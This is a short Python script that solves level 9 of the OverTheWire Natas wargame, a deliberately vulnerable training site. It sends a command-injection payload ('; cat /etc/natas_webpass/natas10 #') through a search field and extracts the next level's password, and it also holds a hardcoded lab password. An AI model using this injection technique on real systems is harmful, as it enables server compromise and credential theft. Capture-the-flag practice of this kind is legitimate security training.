#!/usr/bin/python3

import base64
import codecs
import requests
import re

level = 9
username = 'natas%s' % level
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
url = 'http://%s.natas.labs.overthewire.org/' % username

# First request testing
response = requests.get(url, auth=(username, password))

# View the source code - look for clues
source_response = requests.get(url + 'index-source.html', auth=(username, password))

# This looks like its implementing a search function through a file called dictionary.txt using grep.
# It is also using the passthru() PHP function which executes system commands - this implies that
# this page may have a Remote Code Execution vulnerability! Try a simple one like '; pwd' - this works!
# Note: the semicolon is necessary to end the command (grep -i $key dictionary.txt) and begin a new command.

# Inspecting the POST requests that are generated we can get the params we need. Now, output the contents of the password file.
post_params = {'needle':'; cat /etc/natas_webpass/natas10 #', 'submit':'Search'}
post_response = requests.post(url, auth=(username, password), data=post_params)

# That should do it - now print the password
password = re.findall('<pre>\n(.*)\n</pre>', post_response.text)[0]
print(password)

